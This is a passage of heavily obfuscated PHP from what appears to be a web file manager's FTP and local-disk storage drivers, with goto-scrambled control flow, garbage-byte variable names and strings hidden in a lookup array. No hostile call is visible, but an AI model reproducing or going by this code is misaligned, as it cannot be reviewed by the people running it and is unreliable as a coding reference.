$this->iconvApp($d‚ª•ô£˜İ); goto A §¶‘Ø…; dğ¡éë”¨’: } private function _init($DİÀ·‚Ä¾ = array()) { goto bñ™‘ŸÉ‚; CàÜ¸©¼Ñ¾: foreach ($DİÀ·‚Ä¾ as $BÆÙˆ«Â‰ => $eĞïºçÍôù) { if (isset($this->{$BÆÙˆ«Â‰})) { $this->{$BÆÙˆ«Â‰} = $eĞïºçÍôù; } } $BËê©¸‘Ö¬ = parse_url(trim($this->server, $b‚¤‡‡Œè[8])); $this->host = $BËê©¸‘Ö¬[$b‚¤‡‡Œè[165]]; goto f¶º«Û¼­å; f¶º«Û¼­å: $dÅ» À°Ò¶ = isset($BËê©¸‘Ö¬[$b‚¤‡‡Œè[164]]) && $BËê©¸‘Ö¬[$b‚¤‡‡Œè[164]] == $b‚¤‡‡Œè[889] ? !0 : !1; $this->scheme = $dÅ» À°Ò¶ ? $b‚¤‡‡Œè[890] : $b‚¤‡‡Œè[891]; $this->port = isset($BËê©¸‘Ö¬[$b‚¤‡‡Œè[166]]) ? $BËê©¸‘Ö¬[$b‚¤‡‡Œè[166]] : 21; goto a­…±¬²‹„; a­…±¬²‹„: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return; } $Bîà³¹ÕßŒ = @ftp_login($this->connect, $this->username, $this->userpass); goto eğÂÚ£¢¿³; bñ™‘ŸÉ‚: $b‚¤‡‡Œè =& $_SERVER[İåâé¾]; if (!function_exists($b‚¤‡‡Œè[887])) { show_json(LNG($b‚¤‡‡Œè[888]), !1); } $this->charsetReset($DİÀ·‚Ä¾); goto CàÜ¸©¼Ñ¾; eğÂÚ£¢¿³: @ftp_pasv($this->connect, !0); return $Bîà³¹ÕßŒ; goto e¶Æ¾ÆËï®; e¶Æ¾ÆËï®: } private function _isconn() { return is_resource($this->connect); } public function mkfile($aÉÁ‹™‘¨, $cÁÀìÔ‚Àø = '', $cÛ±™öˆ‚º = REPEAT_RENAME) { goto eª³ù°©‡»; eª³ù°©‡»: if (!$this->_isconn()) { return !1; } $AºŸÖìò = $this->pathFather($aÉÁ‹™‘¨); if (!$this->isFolder($AºŸÖìò) && !$this->mkdir($AºŸÖìò)) { return !1; } goto fòçÌ´·ï¨; fòçÌ´·ï¨: $aÉÁ‹™‘¨ = $this->iconvSystem($aÉÁ‹™‘¨); $Ağ”Ì×Ï = $this->tempFile($this->pathThis($aÉÁ‹™‘¨)); if ($cÁÀìÔ‚Àø) { file_put_contents($Ağ”Ì×Ï, $cÁÀìÔ‚Àø); } goto aè»–ÒĞì; aè»–ÒĞì: $cÁ‡ ®Şœ = $this->upload($this->iconvApp($aÉÁ‹™‘¨), $this->iconvApp($Ağ”Ì×Ï)); $this->tempFileRemve($Ağ”Ì×Ï); return $cÁ‡ ®Şœ ? $this->getPathOuter($aÉÁ‹™‘¨) : !1; goto a¿¯ŸøÜ¨; a¿¯ŸøÜ¨: } public function mkdir($d¿ëÈßïŒ, $bÚ…ÄºŞŒ‹ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $d¿ëÈßïŒ = $this->iconvSystem($d¿ëÈßïŒ); if ($this->isFolder($d¿ëÈßïŒ) || @ftp_mkdir($this->connect, $d¿ëÈßïŒ)) { return $this->getPathOuter($d¿ëÈßïŒ); } if (!$this->mkdir($this->pathFather($d¿ëÈßïŒ))) { return !1; } if ($d¿ëÈßïŒ = @ftp_mkdir($this->connect, $d¿ëÈßïŒ)) { return $this->getPathOuter($d¿ëÈßïŒ); } return !1; } public function copyFile($Fî«îàä²Ã, $c¡»Ì¥Œ©…) { goto cŸÜñËñ©Å; Fª‹É¢Ú‘Ó: $this->tempFileRemve($D…›Ö‰ƒÌ); return $DŠ›é£À²ì; goto aÑª›£²Á; cŸÜñËñ©Å: if (!$this->_isconn()) { return !1; } $A»æ’Ïšä = $this->pathThis($this->iconvSystem($Fî«îàä²Ã)); $D…›Ö‰ƒÌ = $this->tempFile($A»æ’Ïšä); goto e‹™¯„ØŞ½; e‹™¯„ØŞ½: $BËãäÙ‚¶Š = $this->iconvApp($D…›Ö‰ƒÌ); $this->download($Fî«îàä²Ã, $BËãäÙ‚¶Š); $DŠ›é£À²ì = $this->upload($c¡»Ì¥Œ©…, $BËãäÙ‚¶Š); goto Fª‹É¢Ú‘Ó; aÑª›£²Á: } public function moveFile($A‘Ÿóº¯»», $EÙ‡ôòì¾§) { if (!$this->_isconn()) { return !1; } $A‘Ÿóº¯»» = $this->iconvSystem($A‘Ÿóº¯»»); $EÙ‡ôòì¾§ = $this->iconvSystem($EÙ‡ôòì¾§); $D½…Ùà†’¦ = @ftp_rename($this->connect, $A‘Ÿóº¯»», $EÙ‡ôòì¾§); return $D½…Ùà†’¦ ? $this->getPathOuter($EÙ‡ôòì¾§) : !1; } public function delFile($d×ŞÑíÌ½) { if (!$this->_isconn()) { return !1; } $d×ŞÑíÌ½ = $this->iconvSystem($d×ŞÑíÌ½); return @ftp_delete($this->connect, $d×ŞÑíÌ½); } public function delFolder($aˆœŠ£íˆ) { if (!$this->_isconn()) { return !1; } $aˆœŠ£íˆ = $this->iconvSystem($aˆœŠ£íˆ); $cóŠ™èÔ¾Ì = $this->ftpList($aˆœŠ£íˆ); if (!$cóŠ™èÔ¾Ì) { return @ftp_rmdir($this->connect, $aˆœŠ£íˆ); } foreach ($cóŠ™èÔ¾Ì as $b¹¹Ôêº) { if ($this->_isFolder($b¹¹Ôêº)) { $b¹¹Ôêº = $this->iconvApp($b¹¹Ôêº); $this->delFolder($b¹¹Ôêº); } else { @ftp_delete($this->connect, $b¹¹Ôêº); } } return @ftp_rmdir($this->connect, $aˆœŠ£íˆ); } public function rename($bì÷Š‚¶²î, $fõñ«‘¶Š›) { goto E¡«ò×Ñ‰Ö; E¡«ò×Ñ‰Ö: $B¤×¦ÃĞİ‡ =& $_SERVER[İåâé¾]; if (!$this->_isconn()) { return !1; } $a­¤¯¥Á÷Ê = $this->fileNameAuto($this->pathFather($bì÷Š‚¶²î), $fõñ«‘¶Š›); goto fÜ¨Üğ®Œ; a©¡¿Äôá: return $fèâ•®–ˆ« ? $this->getPathOuter($e‹°Ğ°‰³†) : !1; goto b„µÕëÅ£; d‘†¼“˜…: $e‹°Ğ°‰³† = rtrim($Fô©‰–‰, $B¤×¦ÃĞİ‡[8]) . $B¤×¦ÃĞİ‡[8] . $a­¤¯¥Á÷Ê; $fèâ•®–ˆ« = @ftp_rename($this->connect, $bì÷Š‚¶²î, $e‹°Ğ°‰³†); $e‹°Ğ°‰³† = $this->iconvApp($e‹°Ğ°‰³†); goto a©¡¿Äôá; fÜ¨Üğ®Œ: $a­¤¯¥Á÷Ê = $this->iconvSystem($a­¤¯¥Á÷Ê); $bì÷Š‚¶²î = $this->iconvSystem($bì÷Š‚¶²î); $Fô©‰–‰ = $this->pathFather($bì÷Š‚¶²î); goto d‘†¼“˜…; b„µÕëÅ£: } public function _size($EÅòØÂëµÔ) { if (!$this->_isconn()) { return !1; } $EÅòØÂëµÔ = $this->iconvSystem($EÅòØÂëµÔ); return @ftp_size($this->connect, $EÅòØÂëµÔ); } public function _info($F‚™Ğ’¡Œ«) { if (!$this->_isconn()) { return !1; } $F‚™Ğ’¡Œ« = $this->iconvSystem($F‚™Ğ’¡Œ«); if ($this->isFile($F‚™Ğ’¡Œ«)) { return $this->fileInfo($F‚™Ğ’¡Œ«, 1); } else { if ($this->isFolder($F‚™Ğ’¡Œ«)) { return $this->folderInfo($F‚™Ğ’¡Œ«); } } return !1; } private function folderInfo($cù¨åèÓ, $dÄÓ‹¬À—Í = false, $c“Õ´¼Î«˜ = false) { $C¼ò ó»÷º =& $_SERVER[İåâé¾]; $c±ë½šòÇ = $this->iconvApp($this->pathThis($cù¨åèÓ)); if ($c“Õ´¼Î«˜) { return array($C¼ò ó»÷º[28] => $c±ë½šòÇ, $C¼ò ó»÷º[76] => $this->getPathOuter($cù¨åèÓ), $C¼ò ó»÷º[29] => $C¼ò ó»÷º[77]); } $aƒ¦ñ²ï„¶ = array($C¼ò ó»÷º[28] => $c±ë½šòÇ, $C¼ò ó»÷º[76] => $this->getPathOuter($cù¨åèÓ), $C¼ò ó»÷º[29] => $C¼ò ó»÷º[77], $C¼ò ó»÷º[186] => $C¼ò ó»÷º[50], $C¼ò ó»÷º[105] => $C¼ò ó»÷º[50], $C¼ò ó»÷º[190] => 1, $C¼ò ó»÷º[191] => 1, $C¼ò ó»÷º[892] => !0, $C¼ò ó»÷º[893] => !0); if ($dÄÓ‹¬À—Í) { $aƒ¦ñ²ï„¶[$C¼ò ó»÷º[190]] = $this->has($cù¨åèÓ, !1); $aƒ¦ñ²ï„¶[$C¼ò ó»÷º[191]] = $this->has($cù¨åèÓ, !0); } return $aƒ¦ñ²ï„¶; } private function fileInfo($BäÖï´é§Å, $d¦°³‡•éó = false) { $EÁ‚Ğã£¹¶ =& $_SERVER[İåâé¾]; $BäÖï´é§Å = rtrim($BäÖï´é§Å, $EÁ‚Ğã£¹¶[8]); $Fùœ‚ÓÁî = $this->iconvApp($this->pathThis($BäÖï´é§Å)); if ($d¦°³‡•éó) { return array($EÁ‚Ğã£¹¶[28] => $Fùœ‚ÓÁî, $EÁ‚Ğã£¹¶[76] => $this->getPathOuter($BäÖï´é§Å), $EÁ‚Ğã£¹¶[29] => $EÁ‚Ğã£¹¶[163], $EÁ‚Ğã£¹¶[156] => $this->ext($BäÖï´é§Å), $EÁ‚Ğã£¹¶[78] => $this->size($BäÖï´é§Å)); } $bÃ„â‹ÃèÉ = array($EÁ‚Ğã£¹¶[28] => $Fùœ‚ÓÁî, $EÁ‚Ğã£¹¶[76] => $this->getPathOuter($BäÖï´é§Å), $EÁ‚Ğã£¹¶[29] => $EÁ‚Ğã£¹¶[163], $EÁ‚Ğã£¹¶[186] => $EÁ‚Ğã£¹¶[50], $EÁ‚Ğã£¹¶[105] => @ftp_mdtm($this->connect, $BäÖï´é§Å), $EÁ‚Ğã£¹¶[156] => $this->ext($BäÖï´é§Å), $EÁ‚Ğã£¹¶[78] => $this->size($BäÖï´é§Å), $EÁ‚Ğã£¹¶[892] => !0, $EÁ‚Ğã£¹¶[893] => !0); return $bÃ„â‹ÃèÉ; } public function exist($aˆ‰ãÌÇ‹é) { if (!$this->_isconn()) { return !1; } $aˆ‰ãÌÇ‹é = $this->iconvSystem($aˆ‰ãÌÇ‹é); if ($this->size($aˆ‰ãÌÇ‹é) > -1) { return !0; } if ($this->isFolder($aˆ‰ãÌÇ‹é)) { return !0; } return !1; } public function size($cƒÕ‡Ş¥) { return $this->cacheMehod($_SERVER[İåâé¾][894], $cƒÕ‡Ş¥); } public function info($B¬Ş›¯¬æ×) { return $this->cacheMehod($_SERVER[İåâé¾][182], $B¬Ş›¯¬æ×); } public function isFile($d’ßˆà·¾) { return $this->cacheMehod($_SERVER[İåâé¾][183], $d’ßˆà·¾); } public function isFolder($aÔ¹Éé‹„‹) { return $this->cacheMehod($_SERVER[İåâé¾][184], $aÔ¹Éé‹„‹); } public function _isFile($cê¸öß¶Ç) { $D®Ğ×ÉªÍó =& $_SERVER[İåâé¾]; if ($cê¸öß¶Ç == $D®Ğ×ÉªÍó[8]) { return !1; } if (!$this->_isconn() || !$this->exist($cê¸öß¶Ç)) { return !1; } @ftp_chdir($this->connect, $D®Ğ×ÉªÍó[8]); $cê¸öß¶Ç = $this->iconvSystem($cê¸öß¶Ç); return !$this->_isFolder($cê¸öß¶Ç); } public function _isFolder($F‹”Ï½¤Ÿï) { if (!$this->_isconn()) { return !1; } @ftp_chdir($this->connect, $_SERVER[İåâé¾][8]); $F‹”Ï½¤Ÿï = $this->iconvSystem($F‹”Ï½¤Ÿï); return $this->chDir($F‹”Ï½¤Ÿï); } private function chDir($Aé¨®ƒ „Ì) { return @ftp_chdir($this->connect, $Aé¨®ƒ „Ì); } public function listPath($dÔ¼çÕö, $EïëÚîœŸ = false, $dŸ‚Ô×µ£æ = false) { goto BÎ¸õÈ„íì; AÆëÌŞÆ‚¶: $EÑéÍ´‰ç‰ = $this->ftpList($dÔ¼çÕö); $fŒ÷¯È¦Æ× = array($b§»Ù¸µ[75] => array(), $b§»Ù¸µ[74] => array()); if (!$EÑéÍ´‰ç‰) { return $fŒ÷¯È¦Æ×; } goto EÙğöŠÉ; BÎ¸õÈ„íì: $b§»Ù¸µ =& $_SERVER[İåâé¾]; if (!$this->_isconn()) { return !1; } $dÔ¼çÕö = $this->iconvSystem($dÔ¼çÕö); goto AÆëÌŞÆ‚¶; EÙğöŠÉ: foreach ($EÑéÍ´‰ç‰ as $dÔ¼çÕö) { if ($this->_isFolder($dÔ¼çÕö)) { $fŒ÷¯È¦Æ×[$b§»Ù¸µ[75]][] = $this->folderInfo($dÔ¼çÕö, $EïëÚîœŸ, $dŸ‚Ô×µ£æ); } else { $fŒ÷¯È¦Æ×[$b§»Ù¸µ[74]][] = $this->fileInfo($dÔ¼çÕö, $dŸ‚Ô×µ£æ); } } return $fŒ÷¯È¦Æ×; goto AÏ®ñëğá’; AÏ®ñëğá’: } public function has($cÑŸ©†½˜¡, $bò¼Öƒ„…½ = true) { if (!$this->_isconn()) { return !1; } $cÑŸ©†½˜¡ = $this->iconvSystem($cÑŸ©†½˜¡); $Aá¢Ğ›ï¢ï = $this->ftpList($cÑŸ©†½˜¡); if (!$Aá¢Ğ›ï¢ï) { return !1; } foreach ($Aá¢Ğ›ï¢ï as $cÑŸ©†½˜¡) { if ($bò¼Öƒ„…½) { if (!$this->_isFolder($cÑŸ©†½˜¡)) { return !0; } } else { if ($this->_isFolder($cÑŸ©†½˜¡)) { return !0; } } } return !1; } public function listAll($dÙ±øƒÂƒ·) { goto CÕÕåÑìøõ; C¨ÖÍà†ÅŞ: foreach ($FéŒ¸³‰Â[$d†šĞ‹ã¦§[74]] as $a²±·ãÀ·æ) { $eàØêƒ©ÉÕ[] = array($d†šĞ‹ã¦§[76] => $d†šĞ‹ã¦§[8] . trim(str_replace($dÙ±øƒÂƒ·, $d†šĞ‹ã¦§[33], $a²±·ãÀ·æ), $d†šĞ‹ã¦§[8]), $d†šĞ‹ã¦§[77] => 0, $d†šĞ‹ã¦§[78] => $this->size($a²±·ãÀ·æ)); } return $eàØêƒ©ÉÕ; goto bÍµÆ£”ìÂ; CÕÕåÑìøõ: $d†šĞ‹ã¦§ =& $_SERVER[İåâé¾]; if (!$this->_isconn()) { return !1; } $dÙ±øƒÂƒ· = $this->iconvSystem($dÙ±øƒÂƒ·); goto d¾Ãé‰¯; d¾Ãé‰¯: $FéŒ¸³‰Â = $this->recursionFtpFiles($dÙ±øƒÂƒ·); $eàØêƒ©ÉÕ = array(); foreach ($FéŒ¸³‰Â[$d†šĞ‹ã¦§[75]] as $BÉ×¸¾¸£) { $eàØêƒ©ÉÕ[] = array($d†šĞ‹ã¦§[76] => $d†šĞ‹ã¦§[8] . trim(str_replace($dÙ±øƒÂƒ·, $d†šĞ‹ã¦§[33], $BÉ×¸¾¸£), $d†šĞ‹ã¦§[8]) . $d†šĞ‹ã¦§[8], $d†šĞ‹ã¦§[77] => 1, $d†šĞ‹ã¦§[78] => 0); } goto C¨ÖÍà†ÅŞ; bÍµÆ£”ìÂ: } public function getContent($b®ÈÉ³°²‰) { if (!$this->_isconn()) { return !1; } $b®ÈÉ³°²‰ = $this->iconvSystem($b®ÈÉ³°²‰); return $this->fileSubstr($b®ÈÉ³°²‰); } public function setContent($DŒò²¾íÔ, $f™‚ÁÅÍåä = '') { goto fˆÓ™åæäß; c³Ëµä¸ÛÅ: $C»«©İï¿ª = $this->iconvApp($Fè£‚ğ¾ÊŞ); file_put_contents($Fè£‚ğ¾ÊŞ, $f™‚ÁÅÍåä); $D‘ĞÕ¼ğñŞ = $this->upload($DŒò²¾íÔ, $C»«©İï¿ª); goto c‚à¢‹éİ¤; c‚à¢‹éİ¤: $this->tempFileRemve($Fè£‚ğ¾ÊŞ); return $D‘ĞÕ¼ğñŞ; goto D£äå‹Çò¥; fˆÓ™åæäß: if (!$this->_isconn()) { return !1; } $d‹£Ç¯¯† = $this->pathThis($this->iconvSystem($DŒò²¾íÔ)); $Fè£‚ğ¾ÊŞ = $this->tempFile($d‹£Ç¯¯†); goto c³Ëµä¸ÛÅ; D£äå‹Çò¥: } public function fileSubstr($C¢„¯‘äñ, $dÈĞ§èÂË¥ = 0, $C§¿ÄâÆ´“ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($C¢„¯‘äñ, $dÈĞ§èÂË¥, $C§¿ÄâÆ´“); } private function ftpRequest($B¬è¨š¸ŒÈ, $E¤í¹öœÕ° = 0, $Eã¯ÂŒ´ÚÕ = false) { goto C©Ô¤²Ç†‰; Aç¤¹£Î¢†: curl_setopt($E¸ñŞÎ×ä , CURLOPT_URL, $FèİÖ©ÍÅ . $this->pathEncode($B¬è¨š¸ŒÈ)); curl_setopt($E¸ñŞÎ×ä , CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($Eã¯ÂŒ´ÚÕ) { $f±äãƒ‘ËÄ = $E¤í¹öœÕ° + $Eã¯ÂŒ´ÚÕ - 1; curl_setopt($E¸ñŞÎ×ä , CURLOPT_RANGE, "{$E¤í¹öœÕ°}\x2d{$f±äãƒ‘ËÄ}"); } goto e—° ªì†¯; Ağ¸³“¯‰•: return $dÁÖ¢¿Œ‡; goto cé­É’»‰Ñ; C©Ô¤²Ç†‰: $B¬è¨š¸ŒÈ = $this->iconvSystem($B¬è¨š¸ŒÈ); $FèİÖ©ÍÅ = $this->scheme . $this->host . $_SERVER[İåâé¾][4] . $this->port; $E¸ñŞÎ×ä  = curl_init(); goto Aç¤¹£Î¢†; e—° ªì†¯: curl_setopt($E¸ñŞÎ×ä , CURLOPT_RETURNTRANSFER, 1); $dÁÖ¢¿Œ‡ = curl_exec($E¸ñŞÎ×ä ); curl_close($E¸ñŞÎ×ä ); goto Ağ¸³“¯‰•; cé­É’»‰Ñ: } public function upload($dÓ¾œÛ‚º, $B’‘èÆõ, $B²‘ †º½ç = false, $e•µšö„”× = REPEAT_REPLACE) { goto FÑŒÖÔŠš£; FÑŒÖÔŠš£: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($dÓ¾œÛ‚º))) { return !1; } $dÓ¾œÛ‚º = $this->iconvSystem($dÓ¾œÛ‚º); goto BŠ§è»‰×¤; BÚÃ¹Üà¶•: if ($döŒß¤¹Ä != FTP_FINISHED) { return !1; } return $this->getPathOuter($dÓ¾œÛ‚º); goto dùÒÄ®µ‚É; BŠ§è»‰×¤: $B’‘èÆõ = $this->iconvSystem($B’‘èÆõ); $döŒß¤¹Ä = ftp_nb_put($this->connect, $dÓ¾œÛ‚º, $B’‘èÆõ, FTP_BINARY); while ($döŒß¤¹Ä == FTP_MOREDATA) { $döŒß¤¹Ä = ftp_nb_continue($this->connect); } goto BÚÃ¹Üà¶•; dùÒÄ®µ‚É: } public function download($d¶¶ìÅù”„, $EÈç‹·¯¿õ = '') { goto FöøË”‘ˆ‹; c¨Ø•ŞÙ·…: while ($cîÎ¨ã¼‚‚ == FTP_MOREDATA) { $cîÎ¨ã¼‚‚ = ftp_nb_continue($this->connect); } if ($cîÎ¨ã¼‚‚ != FTP_FINISHED) { return !1; } return $this->iconvApp($EÈç‹·¯¿õ); goto eÖ¢öÒøßù; FöøË”‘ˆ‹: if (!$this->_isconn()) { return !1; } $Få†ë¢Ë² = $this->pathFather($EÈç‹·¯¿õ); if (!IO::mkdir($Få†ë¢Ë²)) { return !1; } goto fÇÉÀğÆ“; fÇÉÀğÆ“: $d¶¶ìÅù”„ = $this->iconvSystem($d¶¶ìÅù”„); $EÈç‹·¯¿õ = $this->iconvSystem($EÈç‹·¯¿õ); $cîÎ¨ã¼‚‚ = ftp_nb_get($this->connect, $EÈç‹·¯¿õ, $d¶¶ìÅù”„, FTP_BINARY); goto c¨Ø•ŞÙ·…; eÖ¢öÒøßù: } private function ftpList($e¹æÒ÷šŠÌ) { $Eğ„İìôî„ =& $_SERVER[İåâé¾]; if (!$this->_isFolder($e¹æÒ÷šŠÌ)) { return !1; } @ftp_chdir($this->connect, $Eğ„İìôî„[8]); $e¹æÒ÷šŠÌ = rtrim($e¹æÒ÷šŠÌ, $Eğ„İìôî„[8]) . $Eğ„İìôî„[8]; $F±ğù›ù¢ = @ftp_nlist($this->connect, $e¹æÒ÷šŠÌ); return array_map(function ($f–ÕˆÁ¿) { $B½ÉÌ¥®Îô =& $_SERVER[İåâé¾]; return $B½ÉÌ¥®Îô[8] . ltrim($f–ÕˆÁ¿, $B½ÉÌ¥®Îô[8]); }, $F±ğù›ù¢); } private function recursionFtpFiles($b ò ’óÉ³) { $e„©èßçÏ =& $_SERVER[İåâé¾]; if (!$this->_isconn()) { return !1; } if (!($EİéÌÀö‚Í = $this->ftpList($b ò ’óÉ³))) { return !1; } static $bÂó¼§Ç»Ò = array(); foreach ($EİéÌÀö‚Í as $b ò ’óÉ³) { if ($this->_isFolder($b ò ’óÉ³)) { $this->recursionFtpFiles($b ò ’óÉ³, $bÂó¼§Ç»Ò); $bÂó¼§Ç»Ò[$e„©èßçÏ[75]][] = $b ò ’óÉ³; } else { $bÂó¼§Ç»Ò[$e„©èßçÏ[74]][] = $b ò ’óÉ³; } } return $bÂó¼§Ç»Ò; } } class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($d óÂÑæ‰) { if (substr($d óÂÑæ‰, 0, 2) == $_SERVER[İåâé¾][886]) { $d óÂÑæ‰ = BASIC_PATH . substr($d óÂÑæ‰, 2); } return $d óÂÑæ‰; } public function iconvApp($AƒÄ‚·ÏÔ°) { $E™ŞÇÓÜïå =& $_SERVER[İåâé¾]; global $config; return $this->iconvTo($AƒÄ‚·ÏÔ°, $config[$E™ŞÇÓÜïå[884]], $config[$E™ŞÇÓÜïå[883]]); } public function iconvSystem($eß“ÚŠòš) { $e¸Ñèôà­Î =& $_SERVER[İåâé¾]; global $config; return $this->iconvTo($eß“ÚŠòš, $config[$e¸Ñèôà­Î[883]], $config[$e¸Ñèôà­Î[884]]); } public function getPathOuter($cÆáó—Ñ»Á) { goto B¡·Ãäì¸; bÎŸã¹ÇÑÊ: if (substr($f³ß›Çß›, 0, 2) == $e«¼¹´¥µ[886]) { $f³ß›Çß› = BASIC_PATH . substr($f³ß›Çß›, 2); } if (substr($cÆáó—Ñ»Á, 0, 2) == $e«¼¹´¥µ[886]) { $cÆáó—Ñ»Á = BASIC_PATH . substr($cÆáó—Ñ»Á, 2); } $f³ß›Çß› = KodIO::clear($f³ß›Çß›); goto E›£ÌÉœ; F”ïôìçø: return $this->pathDriver . $e«¼¹´¥µ[8] . ltrim($cÆáó—Ñ»Á, $e«¼¹´¥µ[8]); goto EæŒ‹ß•è¶; E›£ÌÉœ: $cÆáó—Ñ»Á = KodIO::clear($cÆáó—Ñ»Á); $cÆáó—Ñ»Á = substr($cÆáó—Ñ»Á, strlen($f³ß›Çß›)); if (empty($this->pathDriver)) { return $cÆáó—Ñ»Á; } goto F”ïôìçø; B¡·Ãäì¸: $e«¼¹´¥µ =& $_SERVER[İåâé¾]; $f³ß›Çß› = $this->iconvApp($this->pathBase); $cÆáó—Ñ»Á = $this->iconvApp($cÆáó—Ñ»Á); goto bÎŸã¹ÇÑÊ; EæŒ‹ß•è¶: } public function mkfile($B…ÚÕ¾İ, $FÜ·¨¢ºéÍ = '', $bë¿—–ÙŸ§ = REPEAT_RENAME) { $B…ÚÕ¾İ = $this->iconvSystem($B…ÚÕ¾İ); @touch($B…ÚÕ¾İ); if ($FÜ·¨¢ºéÍ) { file_put_contents($B…ÚÕ¾İ, $FÜ·¨¢ºéÍ); } return is_file($B…ÚÕ¾İ) ? $this->getPathOuter($B…ÚÕ¾İ) : !1; } public function mkdir($dÙæÁÊèÍ, $c‹—µÆÃ² = REPEAT_SKIP) { $dÙæÁÊèÍ = $this->iconvSystem($dÙæÁÊèÍ); if (is_dir($dÙæÁÊèÍ)) { return $this->getPathOuter($dÙæÁÊèÍ); } @mkdir($dÙæÁÊèÍ, 511, !0); return is_dir($dÙæÁÊèÍ) ? $this->getPathOuter($dÙæÁÊèÍ) : !1; } public function copyFile($Fó»ø®Öâ•, $b±¡»Ë) { $this->mkdir($this->pathFather($b±¡»Ë)); $Fó»ø®Öâ• = $this->iconvSystem($Fó»ø®Öâ•); $b±¡»Ë = $this->iconvSystem($b±¡»Ë); $d«›Ïœ¬ô¡ = @copy($Fó»ø®Öâ•, $b±¡»Ë); return $d«›Ïœ¬ô¡ ? $this->getPathOuter($b±¡»Ë) : !1; } public function moveFile($A„Óï‹õ‡, $fñ¯¼³¸æÍ) { $this->mkdir($this->pathFather($fñ¯¼³¸æÍ)); $A„Óï‹õ‡ = $this->iconvSystem($A„Óï‹õ‡); $fñ¯¼³¸æÍ = $this->iconvSystem($fñ¯¼³¸æÍ); $b×´¥ñ¸ïÈ = intval(@rename($A„Óï‹õ‡, $fñ¯¼³¸æÍ)); if (!$b×´¥ñ¸ïÈ) { if ($b×´¥ñ¸ïÈ = intval(@copy($A„Óï‹õ‡, $fñ¯¼³¸æÍ))) { @unlink($A„Óï‹õ‡); } } return $b×´¥ñ¸ïÈ ? $this->getPathOuter($fñ¯¼³¸æÍ) : !1; } public function delFile($dî°²œ¡ß°) { $dî°²œ¡ß° = $this->iconvSystem($dî°²œ¡ß°); if (!@unlink($dî°²œ¡ß°)) { @chmod($dî°²œ¡ß°, 511); if (!@unlink($dî°²œ¡ß°)) { return !1; } } else { return !0; } } public function delFolder($f½«¢™¡¼) { goto f¥Ù°Ø¿ë; f¥Ù°Ø¿ë: $Dõö½İå¼ =& $_SERVER[İåâé¾]; $f½«¢™¡¼ = $this->iconvSystem($f½«¢™¡¼); if (!is_dir($f½«¢™¡¼)) { return !0; } goto Dµ„Ü†İ‹Ô; fò¡êô•ÌÓ: return rmdir($f½«¢™¡¼); goto AÔ¼ß Õç±; Dµ„Ü†İ‹Ô: if (!($Bé³ˆÁ²ÖÓ = opendir($f½«¢™¡¼))) { return !1; } while (($a‚†£ñˆë = readdir($Bé³ˆÁ²ÖÓ)) !== !1) { if ($a‚†£ñˆë == $Dõö½İå¼[90] || $a‚†£ñˆë == $Dõö½İå¼[895]) { continue; } $díã ¯™ã’ = $f½«¢™¡¼ . $Dõö½İå¼[8] . $a‚†£ñˆë; if (!is_dir($díã ¯™ã’)) { if (!unlink($díã ¯™ã’)) { chmod($díã ¯™ã’, 511); if (!unlink($díã ¯™ã’)) { return !1; } } } else { chmod($díã ¯™ã’, 511); $díã ¯™ã’ = $this->iconvApp($díã ¯™ã’); if (!$this->delFolder($díã ¯™ã’)) { return !1; } } } closedir($Bé³ˆÁ²ÖÓ); goto fò¡êô•ÌÓ; AÔ¼ß Õç±: } public function rename($b’ÁëÓ‘ÙŒ, $B¡ÌªÂŞ) { goto b²àŒ÷‚‡³; a”Œ¡®¤ğº: $b’ÁëÓ‘ÙŒ = $this->iconvSystem($b’ÁëÓ‘ÙŒ); $CÃÂÊ‚¦½† = $this->pathFather($b’ÁëÓ‘ÙŒ); $Fº¿Ç•‹« = rtrim($CÃÂÊ‚¦½†, $fáº¢ÓÅÖ®[8]) . $fáº¢ÓÅÖ®[8] . $EÑí·ÏíôÔ; goto d¥æĞ¹Š§É; b²àŒ÷‚‡³: $fáº¢ÓÅÖ® =& $_SERVER[İåâé¾]; $EÑí·ÏíôÔ = $this->fileNameAuto($this->pathFather($b’ÁëÓ‘ÙŒ), $B¡ÌªÂŞ); $EÑí·ÏíôÔ = $this->iconvSystem($EÑí·ÏíôÔ); goto a”Œ¡®¤ğº; d¥æĞ¹Š§É: $CĞ™Î½œ‚Í = @rename($b’ÁëÓ‘ÙŒ, $Fº¿Ç•‹«); $Fº¿Ç•‹« = $this->iconvApp($Fº¿Ç•‹«); return $CĞ™Î½œ‚Í ? $this->getPathOuter($Fº¿Ç•‹«) : !1; goto a÷ñ¡öÑöÒ; a÷ñ¡öÑöÒ: } public function _size($dãã¸§·) { $dãã¸§· = $this->iconvSystem($dãã¸§·); return (double) abs(sprintf($_SERVER[İåâé¾][896], @filesize($dãã¸§·))); } public function _info($déòÛõŒŒ) { $déòÛõŒŒ = $this->iconvSystem($déòÛõŒŒ); if ($this->isFolder($déòÛõŒŒ)) { return $this->folderInfo($déòÛõŒŒ, !0); } else { if ($this->isFile($déòÛõŒŒ)) { return $this->fileInfo($déòÛõŒŒ); } } return !1; } protected function infoChildren($dğ’ÊÙ¶á, &$fÜƒ˜‚é­ª) { $e›‹¿©ò¸ =& $_SERVER[İåâé¾]; $dğ’ÊÙ¶á = rtrim($dğ’ÊÙ¶á, $e›‹¿©ò¸[8]) . $e›‹¿©ò¸[8]; $dğ’ÊÙ¶á = $this->iconvSystem($dğ’ÊÙ¶á); if (!($A–ÒÏè³ÅÕ = @opendir($dğ’ÊÙ¶á))) { return; } while (($Bƒ±¾ÙšÛ‚ = readdir($A–ÒÏè³ÅÕ)) !== !1) { if ($Bƒ±¾ÙšÛ‚ == $e›‹¿©ò¸[90] || $Bƒ±¾ÙšÛ‚ == $e›‹¿©ò¸[895]) { continue; } $a ïÉ¿åòí = $dğ’ÊÙ¶á . $Bƒ±¾ÙšÛ‚; $bÀ»Š¢Ü° = $this->iconvApp($a ïÉ¿åòí); if (is_file($a ïÉ¿åòí)) { $fÜƒ˜‚é­ª[$e›‹¿©ò¸[79]]++; $fÜƒ˜‚é­ª[$e›‹¿©ò¸[78]] += $this->size($bÀ»Š¢Ü°); } else { $fÜƒ˜‚é­ª[$e›‹¿©ò¸[80]]++; $this->infoChildren($bÀ»Š¢Ü°, $fÜƒ˜‚é­ª); } } closedir($A–ÒÏè³ÅÕ); } private function 